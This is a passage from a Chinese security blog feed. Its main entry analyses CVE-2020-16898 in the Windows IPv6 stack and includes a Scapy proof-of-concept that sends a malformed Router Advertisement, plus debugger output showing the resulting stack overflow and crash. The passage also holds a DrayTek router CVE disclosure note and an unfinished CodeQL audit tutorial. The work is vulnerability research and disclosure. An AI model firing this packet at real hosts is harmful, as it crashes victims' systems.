href="https://tools.ietf.org/html/rfc8106#section-5.3.1">RFC 8106</a>:</p></blockquote><p>以及补丁的 diff 我们大致定位了漏洞的位置</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020023239.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020023239.png"></a></p><p>漏洞发生的原因应该在 <code>Ipv6pUpdateRDNSS</code> 函数中</p><h2 id="Router-Advertisement-RA-for-short-协议"><a href="#Router-Advertisement-RA-for-short-协议" class="headerlink" title="Router Advertisement (RA for short) 协议"></a><code>Router Advertisement</code> (RA for short) 协议</h2><p>通过 <a href="https://tools.ietf.org/html/rfc8106#section-5.3.1">rfc8106</a> 我们可以知道协议报文如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0                   1                   2                   3</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|     Type      |     Length    |           Reserved            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                           Lifetime                            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                                                               |</span><br><span class="line">:            Addresses of IPv6 Recursive DNS Servers            :</span><br><span class="line">|                                                               |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>我们着重知道以下几个</p><ul><li><strong>Type（1个字节）</strong>：RDNSS选项类型的类型为 25（0x19）</li><li><strong>Length（1个字节）</strong>：如果该选项中包含一个 IPv6 地址，则长度取最小值3 。每增加一个 RDNSS 地址，长度就会增加2。接收器使用“长度”字段来确定选项中IPv6地址的数量</li><li><strong>Addresses of IPv6 Recursive DNS Servers（可变长度，由“Length”字段确定）</strong>：一个或多个递归DNS服务器的 128 位 IPv6 地址 。地址个数为（Length - 1）/ 2</li></ul><p>协议中规定：</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">o  The validity of DNS options is checked with the Length field;</span><br><span class="line">   that is, the value of the Length field in the RDNSS option is</span><br><span class="line">   greater than or equal to the minimum value (3) and satisfies the</span><br><span class="line">   requirement that (Length - 1) % 2 &#x3D;&#x3D; 0.  The value of the Length</span><br><span class="line">   field in the DNSSL option is greater than or equal to the minimum</span><br><span class="line">   value (2).  Also, the validity of the RDNSS option is checked with</span><br><span class="line">   the &quot;Addresses of IPv6 Recursive DNS Servers&quot; field; that is, the</span><br><span class="line">   addresses should be unicast addresses.</span><br></pre></td></tr></table></figure></blockquote><p>即 Length 长度字段要满足 <code>(Length - 1) % 2 == 0</code> 则 length 字段必为奇数，且是大于等于3 的奇数</p><p>假设此时 length 长度为 3， 则地址个数为 （3 - 1) / 2  == 1 ，我们知道一个地址长度为 16 字节。IPv6 Recursive DNS Servers 地址前的字段占 8 字节，每个 IPv6 Recursive DNS Servers 地址长度为 16 个字节，所以正常的 RDNSS 选项总长度应满足 16x+8（x&gt;=1），将其除以 8 就是 2x+1（x&gt;=1） ，也就是 Length 字段应该满足的条件。由于 IPv6 RDNSS 地址为 16 个字节，所以 RDNSS 选项总长度会以 16 字节递增，一个最小的长度为 24（8+16）</p><h2 id="如果-Length-是偶数"><a href="#如果-Length-是偶数" class="headerlink" title="如果 Length 是偶数"></a>如果 Length 是偶数</h2><p>通过学习协议，我们知道通常下， length 的值应为大于等 3 的奇数，但是如果当传入的 length 为偶数 2 ，那么会发生什么事情？</p><p>按照协议理解，此时 （2-1）/2 == 0 ，则会判断此 packet 没有地址，则理应会把 RDNSS 选项的最后 8 个字节错误的认为第下一个个选项的前8个字节。</p><p>例如假设我们设置 length 长度为 4 -&gt; rdnss.len = len(rdnss.dns) * 2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc_last_8_bytes</span>(<span class="params">target_addr</span>):</span></span><br><span class="line">    ip = IPv6(dst = target_addr, src = <span class="string">&quot;fe80::250:56ff:fec0:2222&quot;</span>)</span><br><span class="line">    ra = ICMPv6ND_RA()</span><br><span class="line"></span><br><span class="line">    rdnss = ICMPv6NDOptRDNSS(lifetime=<span class="number">900</span>, dns=[<span class="string">&quot;4141:4141:4141:4141:4141:4141:4141:4141&quot;</span>,</span><br><span class="line">            <span class="string">&quot;4242:4242:4242:4242:4242:4242:4242:4242&quot;</span>])</span><br><span class="line">    <span class="comment"># We put an even value for the option length (correct length should be 5)</span></span><br><span class="line">    rdnss.len = len(rdnss.dns) * <span class="number">2</span></span><br><span class="line">    <span class="comment"># We adjust the actual option size (when &#x27;confused&#x27; is appended to it,</span></span><br><span class="line">    <span class="comment"># it must be rdnss.len * 8 bytes == 0x20 bytes long)</span></span><br><span class="line">    truncated = bytes(rdnss)[: (rdnss.len<span class="number">-1</span>) * <span class="number">8</span>]</span><br><span class="line">    <span class="comment"># The last 8 bytes of the crafted RDNSS option are interpreted as</span></span><br><span class="line">    <span class="comment"># the start of a second option</span></span><br><span class="line">    confused = <span class="string">&#x27;XXXXYYYY&#x27;</span></span><br><span class="line">    crafted = truncated + confused</span><br><span class="line"></span><br><span class="line">    send(ip/ra/crafted)</span><br><span class="line"></span><br><span class="line">poc_last_8_bytes(<span class="string">&#x27;fd15:4ba5:5a2b:1008:79f7:979d:4e:97eb&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020031914.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020031914.png"></a></p><p>我们选取上面的一段汇编做一个简单的注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fffff801&#96;26bca5c8 e8a39de5ff     call    tcpip!NetioAdvanceNetBuffer (fffff801&#96;26a24370)</span><br><span class="line">fffff801&#96;26bca5cd 0fb64301       movzx   eax, byte ptr [rbx+1] ; eax &#x3D; option.length</span><br><span class="line">fffff801&#96;26bca5d1 8d4e01         lea     ecx, [rsi+1]</span><br><span class="line">fffff801&#96;26bca5d4 2bc6           sub     eax, esi              ; eax &#x3D; option.length - 1</span><br><span class="line">fffff801&#96;26bca5d6 4183cfff       or      r15d, 0FFFFFFFFh</span><br><span class="line">fffff801&#96;26bca5da 99             cdq     </span><br><span class="line">fffff801&#96;26bca5db f7f9           idiv    eax, ecx              ; eax &#x3D; (option.length - 1) &#x2F; 2</span><br><span class="line">fffff801&#96;26bca5dd 8b5304         mov     edx, dword ptr [rbx+4]</span><br><span class="line">fffff801&#96;26bca5e0 8945b7         mov     dword ptr [rbp-49h], eax</span><br><span class="line">fffff801&#96;26bca5e3 8bf0           mov     esi, eax</span><br><span class="line">fffff801&#96;26bca5e5 413bd7         cmp     edx, r15d</span><br></pre></td></tr></table></figure><p>即这断代码在做计算 地址数 <code>(4 - 1) / 2 == 1</code>. 因而会将 NET_BUFFER 前进 24 个字节（3*8）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; u rip</span><br><span class="line">tcpip!Ipv6pUpdateRDNSS+0xa9:</span><br><span class="line">fffff801&#96;26bca5dd 8b5304          mov     edx,dword ptr [rbx+4]</span><br><span class="line">fffff801&#96;26bca5e0 8945b7          mov     dword ptr [rbp-49h],eax</span><br><span class="line">fffff801&#96;26bca5e3 8bf0            mov     esi,eax</span><br><span class="line">fffff801&#96;26bca5e5 413bd7          cmp     edx,r15d</span><br><span class="line">fffff801&#96;26bca5e8 7412            je      tcpip!Ipv6pUpdateRDNSS+0xc8 (fffff801&#96;26bca5fc)</span><br><span class="line">fffff801&#96;26bca5ea 0fca            bswap   edx</span><br><span class="line">fffff801&#96;26bca5ec 8d0c12          lea     ecx,[rdx+rdx]</span><br><span class="line">fffff801&#96;26bca5ef 8bc1            mov     eax,ecx</span><br><span class="line">0: kd&gt; rax</span><br><span class="line">ax&#x3D;1</span><br></pre></td></tr></table></figure><p>当我们让程序走到下一个取下一个选项的时候，发现，此时的选项的前8个字节可被伪造</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020033744.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020033744.png"></a></p><h2 id="如何造成栈溢出的？"><a href="#如何造成栈溢出的？" class="headerlink" title="如何造成栈溢出的？"></a>如何造成栈溢出的？</h2><p>我们知道此时可以伪造前 8个字节，那么根据 type 可以走不同的程序流</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020034837.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020034837.png"></a></p><p>根据交叉引用，以及文档此时的函数有 三种 type，分别为</p><p>3： break ，似乎是正常消息</p><p>24：Route Information Option</p><p>25：RDNSS Option （<a href="https://tools.ietf.org/html/rfc4191#section-2.3%EF%BC%89">https://tools.ietf.org/html/rfc4191#section-2.3）</a></p><p>其中 25 是我们触发漏洞的地方， 那么可利用的似乎只有 24 了</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" title="image-20201021004540686" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" alt="image-20201021004540686"></a></p><p>当 type 为 24 的时候，会调用 <code>NdisGetDataBuffer</code> 该函数，我们发现此函数的 v221 值在栈上， Elen为可控的长度 * 8</p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisgetdatabuffer">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisgetdatabuffer</a></p><p>搜索微软文档我们发现该函数原型如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PVOID NdisGetDataBuffer(</span><br><span class="line">  PNET_BUFFER NetBuffer,</span><br><span class="line">  ULONG       BytesNeeded,</span><br><span class="line">  PVOID       Storage,</span><br><span class="line">  UINT        AlignMultiple,</span><br><span class="line">  UINT        AlignOffset</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>其第一个参数 NetBuffer 为一个指向 NET_BUFFER 结构的指针；第二个参数 BytesNeeded 为请求数据的长度；第三个参数 Storage 为指向缓冲区的指针，如果调用者不提供缓冲区，则为 NULL。如果此值非 NULL 且请求的数据不连续，则 NDIS 会将请求的数据复制到 Storage 指向的缓冲区。</p><p>NdisGetDataBuffer 函数返回指向连续数据的指针，或者NULL。如果缓冲区中请求的数据是连续的，则返回值是指向 NDIS 提供的位置的指针。如果数据不连续，则根据 Storage参数来判断：</p><ul><li>如果 Storage 参数为非 NULL，即指定缓冲区指针，则 NDIS 将数据复制到Storage 指向的缓冲区中，返回值为 Storage参数指针 。</li><li>如果 Storage 参数为 NULL，则返回值为 NULL。</li></ul><p>所以我们要通过此函数触发缓冲区溢出，则需要构造一个非连续的的数据包，这个问题的解决方案是构造一个 “碎片化” 的数据。对 IPv6 数据进行分段则可以。</p><p>如果我们发送带有畸形的RDNSS选项的Router Advertisement数据包时，将其分割成若干个IPv6碎片，那么重新组合的数据包数据就会以非连续的方式存储在NET_BUFFER中。这样一来，对NdisGetDataBuffer的调用就会从我们的数据包中复制任意数量的字节到堆栈中的固定大小的缓冲区中，导致基于堆栈的缓冲区溢出，使得我们可以用任意的值覆盖tcpip！Ipv6pHandleRouterAdvertisement的返回地址。</p><p>另外这里要有程序有一个检查，它允许路由信息选项的最大实际大小（option.Length * 3）为0x18。</p><p>即在一个循环遍历所有headers，做一些基本的验证</p><p>如图，Ipv6pHandleRouterAdvertisement 函数中会检查 Route Information 选项中的 Length 是否大于 3 ，如果大于 3 就会进入错误流程，然后忽略这个包的。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021003351.png" title="image-20201021003350639" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021003351.png" alt="image-20201021003350639"></a></p><p>在攻击的过程中</p><p>Route Information 选项的前 8 个字节被嵌到了第一个 Recursive DNS Server 选项的末尾。由于在 Case 0x19 的检查流程中，只判断了 Length 是否小于 3 ，而没有判断该字段是否是偶数值，可导致在对数据包选项进行检查的时候将第一个 Recursive DNS Server 选项长度误当成 0x20，因此检查是通过的。而在真正处理的过程中，又将其长度解析为 0x18</p><p>对于type为0x18会进入下面的流程处理，调用NdisGetDataBuffer函数，其中第二个参数为长度的实际字节大小，等于length<em>8，所以此时传入的actual_length_bytes = 0x22</em> 8 = 0x110：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" title="image-20201021004540686" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" alt="image-20201021004540686"></a></p><p>而Storage_1 为栈上的数组变量，将0x110个字节赋值过去，就会造成栈上的溢出，实际的崩溃是溢出覆盖了stack cookie，触发tcpip!_security_check_cookie，造成蓝屏（BSOD）：</p><p>最后贴一个蓝屏：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020040544.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020040544.png"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html">https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html</a></p><p><a href="http://site.pi3.com.pl/exp/p_CVE-2020-16898.py">http://site.pi3.com.pl/exp/p_CVE-2020-16898.py</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-16898" scheme="https://bestwing.me/tags/CVE-2020-16898/"/>
    
  </entry>
  
  <entry>
    <title>DrayTek Vigor 2960 从未授权到rce</title>
    <link href="https://bestwing.me/drayteck-vigor-vulnerability-disclosure.html"/>
    <id>https://bestwing.me/drayteck-vigor-vulnerability-disclosure.html</id>
    <published>2020-10-18T16:00:00.000Z</published>
    <updated>2020-10-20T17:11:25.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>4月多的时候出差去了南京，加上三月初的时候 360 netlab 公开两个 DrayTek 的漏洞，我也简单分析了一下以及复现了下 exploit ，这里就不细讲了。所以晚上无聊的时候在找这个设备的是否存在其他漏洞，刚好巧合的是  @C0ss4ck（之前在我司实习过） 他也在看，所以一起挖掘了以下 11个漏洞</p><p>这里公开的 PPT 由@C0ss4ck 和我完成，由于时间安排所以我没去 DEFCON GROUP 25</p><div class="row"><iframe src="https://drive.google.com/file/d/1z4QZctHU3XYB-X9jXiWrTGhMLJqP27ub/preview" style="width:100%; height:550px"></iframe></div><p>可能有的人就问了，11 个漏洞，为啥只有 2个 cve 号呢？ 很简单，由于某些原因大家都知道 CVE 似乎不怎么理个人申请了，所以我们拜托的厂商帮我们申请的，厂商把漏洞分成 命令注入和缓冲区溢出 一起分批申请的，然后 CVE 只给了两个编号 （orz）</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li>2020.05.29 report these vulnerabilities</li><li>2020.06.01 vendor reply</li><li>2020.06.04 vendor fix these vulnerabilities</li><li>2020.06.17 vendor released new firmware</li><li>2020.06.19 CVE-2020-14472, CVE-2020-14473</li></ul><h2 id="官方致谢"><a href="#官方致谢" class="headerlink" title="官方致谢"></a>官方致谢</h2><p><a href="https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-remote-code-injection/execution-vulnerability-(cve-2020-14472)/">https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-remote-code-injection/execution-vulnerability-(cve-2020-14472)/</a></p><p><a href="https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-stack-based-buffer-overflow-vulnerability-(cve-2020-14473)/">https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-stack-based-buffer-overflow-vulnerability-(cve-2020-14473)/</a></p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><a href="https://gist.github.com/WinMin/46165779215f1d47ec257210428c0240">https://gist.github.com/WinMin/46165779215f1d47ec257210428c0240</a><br><a href="https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md">https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="DrayTek" scheme="https://bestwing.me/tags/DrayTek/"/>
    
    <category term="CVE-2020-14472" scheme="https://bestwing.me/tags/CVE-2020-14472/"/>
    
    <category term="CVE-2020-14473" scheme="https://bestwing.me/tags/CVE-2020-14473/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 的学习以及尝试漏洞挖掘</title>
    <link href="https://bestwing.me/codeql.html"/>
    <id>https://bestwing.me/codeql.html</id>
    <published>2020-09-10T16:00:00.000Z</published>
    <updated>2021-02-06T08:52:26.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="CodeQL-背景"><a href="#CodeQL-背景" class="headerlink" title="CodeQL 背景"></a>CodeQL 背景</h2><p>CodeQL 是一个白盒源代码审计工具。其开发公司 Semmle 也成功和 Github 联姻，成立了 Github Security Lab，负责 Github 上开源软件的代码安全审计。</p><p>网上关于该工具的安装教程见官方文档，顺便一说网上的教程也不少，这里就不赘述了。</p><h2 id="CodeQL-使用"><a href="#CodeQL-使用" class="headerlink" title="CodeQL 使用"></a>CodeQL 使用</h2><p>官方提供了 QL 语法的文档： <a href="https://help.semmle.com/QL/ql-handbook/">https://help.semmle.com/QL/ql-handbook/</a> 以及 CodeQL 的一些 api 接口 <a href="https://help.semmle.com/qldoc/cpp/">https://help.semmle.com/qldoc/cpp/</a></p><p>关于CodeQL 使用，在这篇文章咱们以一个 Github Security Lab 公开的教程作为示例 </p><p>CodeQL CTF 2: U-Boot</p><ul><li><a href="https://securitylab.github.com/ctf/uboot">CTF 2: U-Boot Challenge</a> - Follow in the footsteps of our security research team and discover 13 vulnerabilities un U-Boot. Language: C - Difficulty level: </li></ul><h3 id="0x01-查找特定函数的定义"><a href="#0x01-查找特定函数的定义" class="headerlink" title="0x01 查找特定函数的定义"></a>0x01 查找特定函数的定义</h3><p>CodeQL 使用的时候需要通过 <code>import</code>  关键词导入特定语言的解析库，例如这里使用的是 <code>import cpp</code> ，如果我要查询 <code>strlen</code> 的函数定义，我只需要编写如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName() &#x3D; &quot;strlen&quot;</span><br><span class="line">select f, &quot;a function named strlen&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>右键点击运行，效果如下</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173438.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173438.png"></a></p><p>其中第三个是关于 <code>strlen</code> 的定义，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173541.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173541.png"></a></p><h3 id="0x2-查找特定宏定义"><a href="#0x2-查找特定宏定义" class="headerlink" title="0x2 查找特定宏定义"></a>0x2 查找特定宏定义</h3><p>但是在 c 代码里， 有些情况我们需要查找宏的定义，这个时候就需要使用 <code>Macro</code> 这个 Predicates， 例如样例里提到的 <code>ntohs</code> 族，函数</p><!--**`ntohl`，`ntohll`和`ntohs`可以是函数或宏（取决于其中的代码被编译在平台上）。**--><p>另外， QL 语言支持正则匹配，我们可以通过 <code>regexpMatch</code> 匹配一类函数例如如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Macro m</span><br><span class="line">where m.getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select m</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x3-函数的调用"><a href="#0x3-函数的调用" class="headerlink" title="0x3 函数的调用"></a>0x3 函数的调用</h3><p>在代码审计的场景里，我们在查找函数定义的同时，也需要根据函数调用查找完整的数据流，在 CodeQL 里，函数的调用通过 <code>FunctionCall</code> 这个 Predicates 可以直接完成，例如如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from FunctionCall c</span><br><span class="line">where c.getTarget().getName() &#x3D; &quot;memcpy&quot;</span><br><span class="line">select c</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910174736.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910174736.png"></a></p><h3 id="0x04-宏定义的调用"><a href="#0x04-宏定义的调用" class="headerlink" title="0x04 宏定义的调用"></a>0x04 宏定义的调用</h3><p>查找宏定义的的调用，使用 <code>MacroInvocation</code> 完成，代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MacroInvocation mi</span><br><span class="line">where mi.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select mi</span><br></pre></td></tr></table></figure><h3 id="0x05-获取-ntohs-族宏定义的表达式"><a href="#0x05-获取-ntohs-族宏定义的表达式" class="headerlink" title="0x05 获取 ntohs 族宏定义的表达式"></a>0x05 获取 ntohs 族宏定义的表达式</h3><p>在 0x04 中，我们提到了宏定义的调用，另外我们知道， <code>ntoh</code> 族函数，通常用来进行网络字节序到主机字节序的转换，通常而言，如果是一个网络协议，我们可能会从某个字段中取出某个特定的值，并且赋值给某个变量，这个时候我们就需要获取他们的表达式。</p><p>这里以表达式出现的话，我们可以使用 <code>getExpr()</code>函数完成，仅仅只需要将 <code>select mi</code> 修改为 <code>select mi.getExpr()</code> ，效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from MacroInvocation mi</span><br><span class="line">where mi.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select mi.getExpr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910175832.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910175832.png"></a></p><p>例如这里的赋值语句就是第 78 个表达式</p><h3 id="0x06-编写一个-QL-类"><a href="#0x06-编写一个-QL-类" class="headerlink" title="0x06 编写一个 QL 类"></a>0x06 编写一个 QL 类</h3><p>QL 类包括三个部分</p><ol><li>关键字<code>class</code>。</li><li>类的名称。这是一个 以大写字母开头的<a href="https://help.semmle.com/QL/ql-spec/language.html#identifiers">标识符</a>。</li><li>要扩展的类型。</li><li><a href="https://help.semmle.com/QL/ql-handbook/types.html#class-bodies">类</a>的<a href="https://help.semmle.com/QL/ql-handbook/types.html#class-bodies">主体</a>，用大括号括起来。</li></ol><p>更多关于类的编写可以参考 <a href="https://help.semmle.com/QL/ql-handbook/types.html#classes">https://help.semmle.com/QL/ql-handbook/types.html#classes</a></p><p>这里我们需要编写尝试编写一个 <code>NetworkByteSwap</code> 的类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * An expression involved when swapping the byte order of network data.</span><br><span class="line"> * Its value is likely to have been read from the network.</span><br><span class="line"> *&#x2F;</span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists(MacroInvocation mi |</span><br><span class="line">      mi.getMacroName().regexpMatch(&quot;ntoh(s|l|ll)&quot;) and</span><br><span class="line">      this &#x3D; mi.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from NetworkByteSwap n</span><br><span class="line">select n</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x07-数据流分析"><a href="#0x07-数据流分析" class="headerlink" title="0x07 数据流分析"></a>0x07 数据流分析</h3><p>现在我们来开始做数据流分析，<strong>通过定义源和接收器来创建<a href="https://help.semmle.com/qldoc/cpp/semmle/code/cpp/dataflow/TaintTracking.qll/type.TaintTracking$TaintTracking$Configuration.html">配置</a>类。</strong> 来源应该是调用<code>ntohl</code>，<code>ntohll</code>或<code>ntohs</code>。该接收器应为不安全调用memcpy的size参数。通过查找此类的数据流判断是否存在安全问题</p><p>这里需要使用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br></pre></td></tr></table></figure><p>两个新库，然后我们要设置 来源和 Sink 的对象。</p><p>首先设置来源：</p><figure class="highlight plain"><table><tr><td 